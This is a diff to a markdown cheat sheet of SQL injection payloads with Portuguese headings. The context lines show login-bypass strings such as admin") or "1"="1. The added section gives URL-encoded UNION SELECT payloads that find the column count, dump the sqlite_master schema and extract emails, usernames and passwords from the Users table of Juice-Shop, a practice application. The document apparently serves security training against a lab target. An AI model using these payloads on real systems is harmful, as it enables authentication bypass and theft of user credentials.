@@ -1,4 +1,4 @@
-# SQL Inject Payloads
+# SQL Inject Basic Payloads
 ```
 '
 ' --
@@ -39,7 +39,7 @@ Comentarios:
 ;%00
 `
 ```
-# SQL Inject Bypass de Autenticação
+# SQL Inject Bypass de Auth
 ```
 '-'
 ' '
@@ -82,6 +82,20 @@ admin") or "1"="1
 admin") or "1"="1"--
 admin") or "1"="1"#
 admin") or "1"="1"/*
+```
+# SQL Inject Extract Schema Database Juice-Shop
+```
+')
+
+'))%20--%2
+
+'))%20order%20by%209%20--%20
+
+'))%20union%20all%20select%201,2,3,4,5,6,7,8,9%20--%20
+
+a'))%20union%20all%20select%201,2,3,sql,5,6,7,8,9%20from%20sqlite_master%20--%20
+
+'))%20union%20all%20select%201,email,username,4,password,6,7,8,9%20from%20Users%20--%20
 ```
 ## Links
 
